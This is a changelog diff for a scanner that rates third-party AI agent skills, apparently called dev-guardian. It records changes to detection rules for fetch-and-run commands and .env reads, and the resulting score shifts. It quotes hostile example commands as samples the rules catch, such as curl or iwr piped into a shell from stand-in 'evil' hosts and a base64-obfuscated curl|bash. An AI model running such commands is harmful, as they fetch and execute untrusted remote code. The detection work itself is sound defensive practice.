@@ -179,11 +179,14 @@ version bump.
     - the prose rules now read a host with no scheme (`curl -fsSL
       get.evil-tools.io | sh`, `iwr -useb evil.example.com/x.ps1 | iex`);
     - the downgrade rewarded obfuscation (`echo <b64> | base64 -d | xargs
-      curl -fsSL | bash`, no target on purpose): code is now scored a level
-      lower ONLY when a placeholder stands where its target would be — `…`,
-      a standalone `...`, `<url>` / `<script>` / `<path>` in an argument's
-      position, or `example.com` / `.org` / `.net` themselves (not their
-      subdomains). An absent target is full severity;
+      curl -fsSL | bash`, no target on purpose): a rule that fetches or
+      sends — curl|bash and its interpreter forms, download-then-run, the
+      send-over-network rules — is now scored a level lower ONLY where a
+      placeholder stands for its target (`…`, a standalone `...`, `<url>` /
+      `<script>` / `<path>` in an argument's position, or `example.com` /
+      `.org` / `.net` themselves, not their subdomains); an absent target is
+      full severity. Every other rule keeps the downgrade when nothing near
+      it is a fetch target;
     - indented code blocks, `<pre>` and `<code>` are code, with continued
       lines joined and HTML character references decoded (`&#124;` is `|`);
       indentation counts as a code block only in Markdown and text files;
@@ -193,16 +196,25 @@ version bump.
       `python3 <(curl …)`, `| perl`, `| ruby`, `| php`, `| pwsh`); and a new
       rule, `sc-download-then-run`, for a file downloaded with `curl -o` /
       `-O`, `wget` or `iwr -OutFile` and run further down the same file.
+    - `de-read-sensitive-files` reads `.env` only where its content is shown
+      or shipped — printed or piped (`cat`, `grep` without `-q`, …),
+      redirected in, or the source of a copy — and never a template
+      (`.env.example`, `.sample`, …). Measured on the corpus, every `.env`
+      hit was something else: `cp .env.example .env`, `chmod 600 …/.env`, a
+      hook's `[[ $file_path == *.env ]]` guard that blocks writes to it, a
+      loader's docstring. `.env` sent in one command stays critical
+      (`de-sensitive-file-over-network`).
     dev-guardian's own `skills/` and `commands/` are unchanged (5 and 0,
-    SAFE). The cost, re-measured on the same 75 third-party skills (33 SAFE,
-    13 REVIEW, 1 CAUTION, 28 DO_NOT_INSTALL before; 31, 11, 4, 29 after),
-    all from full severity where no placeholder stands for the target:
-    hookify `writing-rules` 40 CAUTION → 100 DO_NOT_INSTALL (fenced detection
-    patterns); `build-mcpb` 20 SAFE → 50 CAUTION; discord `configure` 35
-    REVIEW → 50 CAUTION and `claude-automation-recommender` 35 → 50 (a
-    `.env` path); `playground` 35 REVIEW → 45 CAUTION (`innerHTML`);
-    `mcp-integration` 20 SAFE → 35 REVIEW; `m5-onboard` 60 → 75, already
-    DO_NOT_INSTALL.
+    SAFE). Re-measured on the same 75 third-party skills against the second
+    round (33 SAFE, 13 REVIEW, 1 CAUTION, 28 DO_NOT_INSTALL; now 34, 15, 0,
+    26), the only findings that move are those `.env` non-reads:
+    `ui-ux-pro-max`'s `design` skill (two copies) 100 DO_NOT_INSTALL → 33
+    REVIEW, plugin-dev `plugin-settings` 33 REVIEW → 0 SAFE, hookify
+    `writing-rules` 40 CAUTION → 30 REVIEW, and lower scores with the same
+    verdict for discord `configure`, `claude-automation-recommender` and
+    `hook-development`. A test pins the corpus shapes — fenced detection
+    patterns, `rm -rf /tmp` in a doc block, `cp .env.example .env`, `chmod
+    600` on a `.env` — to no high finding.
 - **dev-guardian's own `skills/` scored DO_NOT_INSTALL (60) under
   `scan_skill`** — already 55 at 3.0.0. `guardian-scanskill`'s "what it
   detects" table quoted the phrases the prompt-level rules catch (an
